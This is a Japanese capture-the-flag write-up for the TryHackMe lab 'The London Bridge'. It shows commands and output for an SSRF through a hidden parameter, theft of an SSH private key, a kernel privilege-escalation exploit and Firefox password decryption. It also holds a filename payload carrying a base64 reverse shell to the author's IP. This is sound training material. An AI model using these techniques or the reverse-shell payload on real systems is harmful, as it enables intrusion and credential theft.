# The London Bridge CTF

https://tryhackme.com/room/thelondonbridge

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.246.86
sudo bash -c "echo $TARGET   londonbridge.thm >> /etc/hosts"

root@ip-10-10-145-59:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-16 23:47 BST
Nmap scan report for londonbridge.thm (10.10.246.86)
Host is up (0.000089s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 02:EA:39:10:7E:DF (Unknown)

root@ip-10-10-145-59:~# sudo nmap -sS -A -p22,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-16 23:48 BST
Nmap scan report for londonbridge.thm (10.10.246.86)
Host is up (0.00020s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http-proxy gunicorn
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 May 2025 22:48:27 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2682
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Explore London</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #f2f2f2;
|     header {
|     background-color: #333;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     background-color: #444;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     color: #fff;
|     text-decoration: none;
|     margin: 0 10p
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 May 2025 22:48:27 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|_    Content-Length: 0
|_http-server-header: gunicorn
|_http-title: Explore London
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=5/16%Time=6827C0BB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,B15,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Fri,\x2016\x20May\x202025\x2022:48:27\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2026
SF:82\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x
SF:20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\
SF:x20\x20\x20<title>Explore\x20London</title>\n\x20\x20\x20\x20<style>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20background-color:\x20#f2f2f2;\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20nav\x20{\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#44
SF:4;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center
SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20n
SF:av\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x2
SF:0#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration
SF::\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x20
SF:0\x2010p")%r(HTTPOptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunic
SF:orn\r\nDate:\x20Fri,\x2016\x20May\x202025\x2022:48:27\x20GMT\r\nConnect
SF:ion:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:
SF:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x200\r\n\r\n");
MAC Address: 02:EA:39:10:7E:DF (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH、HTTP（8080）

### サブドメイン

```shell
ffuf -u http://londonbridge.thm:8080 -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.londonbridge.thm' -fs 2682
```

無し。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://londonbridge.thm:8080 -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/dejaview             (Status: 200) [Size: 823]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1722]
/upload               (Status: 405) [Size: 178]
/view_image           (Status: 405) [Size: 178]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

### gallery

画像のアップロード機能。/upload にアップロードされる。画像のみアップロード可能なフィルターがある。

### /dejaview

imageのURLを入力。/view_image でURLをPostする。自分のIP宛にリクエストが来たのでSSRFがあるかと思ったが、自分のブラウザでリクエストしていただけなのでSSRFは無いと思われる。

### /contact

メッセージを入力すると、/feedback に転送され、内容を確認すると表示される。XSSの可能性はある。

## gallery

1. 普通にJPEG画像をアップロード　→　アップロードできた
2. MIME-TYPE を text/x-php に変更　→　アップロードできた
3. 1のマジックナンバーを壊す　→　フィルターされた
4. 1の拡張子をphpにする　→　アップロードできた
5. pentest.php の先頭12バイトを1と同じにする　→　フィルターされた
6. マジックナンバーを1のJPEGと同じにする　→　フィルターされた
7. 1の後にリダイレクト>>でPHPを追加。拡張子PHP　→　アップロードできた

PHPをアップロードできたが、アクセスしたら実行されるのではなくダウンロードになって失敗。

ソースに下記コメントがあった。おそらく、/dejaview を指していると思われる。
```html
<!--To devs: Make sure that people can also add images using links-->
```

## /dejaview

ヒントにある開発用の隠しパラメータは、/view_image にあるのではないかと見当を付ける。

```shell
# POST隠しパラメータを探す
ffuf -u 'http://10.10.246.86:8080/view_image' -c -X POST -d 'image_url=http%3A%2F%2F10.13.85.243%3A8000%2Fimage.jpg&FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 901

# GET隠しパラメータを探す
ffuf -u 'http://10.10.246.86:8080/view_image?FUZZ=1' -c -X POST -d 'image_url=http%3A%2F%2F10.13.85.243%3A8000%2Fimage.jpg' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 901
```

見つからなかった。/dejaview のGETにも無かった。

Discovery/Web-Content/common.txt を試したら、www が出てきた。

```shell
$ ffuf -u 'http://10.10.246.86:8080/view_image' -c -X POST -d 'image_url=http%3A%2F%2F10.13.85.243%3A8000%2Fimage.jpg&FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 901              

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.246.86:8080/view_image
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : image_url=http%3A%2F%2F10.13.85.243%3A8000%2Fimage.jpg&FUZZ=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 901
________________________________________________

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 286ms]
:: Progress: [4734/4734] :: Job [1/1] :: 143 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```

wwwで自分のIPを指定すると、ターゲットからリクエストが来た。

```http
POST /view_image HTTP/1.1
Host: 10.10.246.86:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.246.86:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Connection: keep-alive
Upgrade-Insecure-Requests: 1

www=http%3A%2F%2F10.13.85.243%3A8000%2Fimage.jpg
```

```shell
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.246.86 - - [16/May/2025 20:36:23] code 404, message File not found
10.10.246.86 - - [16/May/2025 20:36:23] "GET /image.jpg HTTP/1.1" 404 -
```

SSRFが成立することは判明したが、何をリクエストさせたら良いのか？

## SSRF

ローカルに開かれているポートを探す。  
http://localhost:xxx は拒否されるので、http://127.1:xxx で回避している。

```shell
$ seq 65535 > ports.txt

$ ffuf -u 'http://10.10.246.86:8080/view_image' -c -X POST -d 'www=http://127.1:FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w ./ports.txt -fs 290                  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.246.86:8080/view_image
 :: Wordlist         : FUZZ: /home/kali/CTF/london/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 290
________________________________________________

80                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 293ms]
8080                    [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 265ms]
:: Progress: [65535/65535] :: Job [1/1] :: 148 req/sec :: Duration: [0:09:04] :: Errors: 0 ::
```

80ポートが開いている。

### 80ポート

```http
POST /view_image HTTP/1.1
Host: 10.10.246.86:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.246.86:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Connection: keep-alive
Upgrade-Insecure-Requests: 1

www=http://127.1:80
```

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 17 May 2025 00:56:11 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 1270

<HTML>
<body bgcolor="gray">
<h1>London brigde</h1>
<img height=400px width=600px src ="static/1.webp"><br>
<font type="monotype corsiva" size=18>London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    Build it up with iron bars<br>
    Iron bars, iron bars<br>
    Build it up with iron bars<br>
    My fair lady<br>
    Iron bars will bend and break<br>
    Bend and break, bend and break<br>
    Iron bars will bend and break<br>
    My fair lady<br>
<img height=400px width=600px src="static/2.webp"><br>
<font type="monotype corsiva" size=18>Build it up with gold and silver<br>
    Gold and silver, gold and silver<br>
    Build it up with gold and silver<br>
    My fair lady<br>
    Gold and silver we've not got<br>
    We've not got, we've not got<br>
    Gold and silver we've not got<br>
    My fair lady<br>
<img height=400px width=600px src="static/3.jpg"><br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair beth</font>
</body>
</HTML>
```

役に立つ情報は無い。

### 80ポートのディレクトリサーチ

```shell
root@ip-10-10-145-59:~# ffuf -s -u 'http://10.10.246.86:8080/view_image' -c -X POST -d 'www=http://127.1:80/FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fr 'Error code: 404'
# Copyright 2007 James Fisher
# directory-list-2.3-medium.txt
# or send a letter to Creative Commons, 171 Second Street, 
#
#
# on atleast 2 different hosts
# Suite 300, San Francisco, California, 94105, USA.
# This work is licensed under the Creative Commons 

#
#
templates
uploads
static
%3FRID%3D2671
localhost
```

### uploads

8080ポートでアップロードしたファイルがリスト表示された。

```
www=http://127.1:80/uploads/
```

### templates

8080ポートのgalleryページで使われているテンプレートが表示された。

```
www=http://127.1:80/templates/
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>London Gallery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: wheat;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            grid-gap: 20px;
        }
        .image {
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <h1>London Gallery</h1>
    <div class="container">
        {% for filename in filenames %}
            <img class="image" src="{{ url_for('download_file', filename=filename) }}" alt="{{ filename }}">
        {% endfor %}
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>
```

`"{{ filename }}"` でテンプレートインジェクションが成立するか？

下記は失敗。

```shell
cp ./hora.jpeg ./"request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEzLjg1LjI0My82NjY2IDA+JjE=|base64 -d|bash').read().jpeg"
```

アップロードしたとき、括弧、シングルクォート、パイプが削除され、スペースがアンダースコアに変換されていた。

```
http://10.10.246.86:8080/uploads/request.application.__globals__.__builtins__.__import__os.popenecho_L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEzLjg1LjI0My82NjY2IDAJjEbase64_-dbash.read.jpeg
```

`7*7` を試しても、77.jpeg に変換されたため、テンプレートインジェクションは断念。
```shell
$ cp ./hora.jpeg "7*7.jpeg"
```

### 再ディレクトリサーチ

big.txt でサーチ。

```shell
root@ip-10-10-145-59:~# ffuf -s -u 'http://10.10.246.86:8080/view_image' -c -X POST -d 'www=http://127.1:80/FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fr 'Error code: 404'
.bashrc
.bash_history
.ssh
.profile
static
templates
uploads
```

.ssh ディレクトリがあった。  

```
www=http://127.1:80/.ssh/id_rsa
```

SSH秘密鍵を入手。問題は、ユーザー名が分からないこと。

下記でユーザー名が beth と判明。
```
www=http://127.1:80/.ssh/authorized_keys
```

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

```sh
ssh beth@10.10.246.86 -i ./id_rsa
```

## 権限昇格１

bethのホームにはユーザーフラグらしきものはない。

```shell
beth@london:~$ ls -al
total 72
drwxr-xr-x 11 beth beth 4096 May  7  2024 .
drwxr-xr-x  4 root root 4096 Mar 10  2024 ..
-rw-rw-r--  1 beth beth 3215 Apr 17  2024 app.py
lrwxrwxrwx  1 root root    9 Sep 17  2023 .bash_history -> /dev/null
-rw-r--r--  1 beth beth  220 Sep 16  2023 .bash_logout
-rw-r--r--  1 beth beth 3771 Sep 16  2023 .bashrc
drwx------  4 beth beth 4096 Mar 11  2024 .cache
drwxrwxr-x  6 beth beth 4096 Sep 17  2023 .env
drwx------  3 beth beth 4096 Mar 10  2024 .gnupg
-rw-rw-r--  1 beth beth  328 Apr 17  2024 gunicorn_config.py
-rw-r--r--  1 beth beth 1270 Apr 17  2024 index.html
drwxrwxr-x  5 beth beth 4096 Mar 11  2024 .local
-rw-r--r--  1 beth beth  807 Sep 16  2023 .profile
drwxrwxr-x  2 beth beth 4096 Apr 23  2024 __pycache__
-rw-rw-r--  1 root root   66 Sep 18  2023 .selected_editor
drwx------  2 beth beth 4096 Mar 25  2024 .ssh
drwxrwxr-x  2 beth beth 4096 Apr 17  2024 static
-rw-r--r--  1 beth beth    0 Sep 16  2023 .sudo_as_admin_successful
drwxrwxr-x  2 beth beth 4096 Apr 17  2024 templates
drwxrwxr-x  2 beth beth 4096 May 16 18:35 uploads

beth@london:~$ ls -al /home
total 16
drwxr-xr-x  4 root    root    4096 Mar 10  2024 .
drwxr-xr-x 23 root    root    4096 Apr  7  2024 ..
drwxr-xr-x 11 beth    beth    4096 May  7  2024 beth
drw-------  3 charles charles 4096 Apr 23  2024 charles
```

直接探したら、`__pychache__` の中に隠されていた。

```shell
beth@london:~$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "THM{" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'
/home/beth/__pycache__/user.txt:THM{l0.................}
```

### サービス

```shell
beth@london:~$ cat /etc/systemd/system/app.service
[Unit]
Description=My service
After=multi-user.target

[Service]
Type=simple
Restart=always
WorkingDirectory=/home/beth
Environment="PATH=/home/beth"
ExecStart=/home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app

[Install]
WantedBy=multi-user.target
```

```shell
beth@london:~$ ls -al /home/beth/gunicorn_config.py
-rw-rw-r-- 1 beth beth 328 Apr 17  2024 /home/beth/gunicorn_config.py
beth@london:~$ ls -al /home/beth/.local/bin/gunicorn
-rwxrwxr-x 1 beth beth 221 Mar 11  2024 /home/beth/.local/bin/gunicorn
```

サービスを再起動できるならルートシェルをとれそうだが、それができない。

ギブアップ。

### カーネルエクスプロイト

`4.15.0-112　kernel exploit` で検索すれば一番に出てくるが、難解。

https://github.com/zerozenxlabs/ZDI-24-020/blob/main/README.md

```
beth@london:~$ ./exploit ubuntu
[+] Attempt 1/10
[+] Found kernel '4.15.0-112-generic' [run_cmd]
[+] Found kernel .text, 0xffffffff87a00000
[!] need at least 3 cores ideally, found 2
[+] UAF seems to have hit
[+] Payload ran correctly, spawning shell
uid=0(root) gid=0(root) groups=0(root),1000(beth)
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
```

```shell
bash-4.4# ls -al
total 52
drwx------  6 root root 4096 Apr 23  2024 .
drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Apr 23  2024 .cache
-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
drwx------  3 root root 4096 Apr 23  2024 .gnupg
drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
bash-4.4# cat .root.txt
THM{l0nd............}
```

ルートフラグゲット。

## チャールズのパスワード

最初、/etc/shadow からクラックしようとしたが失敗した。

チャールズのホームにmozillaのプロファイルがあった。

```shell
bash-4.4# tar -czvf mozilla.tar.gz ./.mozilla
bash-4.4# python3 -m http.server
```

```shell
$ git clone https://github.com/unode/firefox_decrypt.git

$ firefox_decrypt/firefox_decrypt.py ./firefox/8k3bf3zp.charles
```


## 振り返り

- PHPが動いていないサイトでPHPをアップロードしても無駄。
- 80ポートのディレクトリサーチで、big.txt をマージしたリストを使わなかった点が悔やまれる。悪い癖。
- AttackBox の ffuf は、-s オプションを付けておかないとノイズで見逃す。
- 低評価を食らうであろう嫌がらせが至る所に散りばめられていた印象。
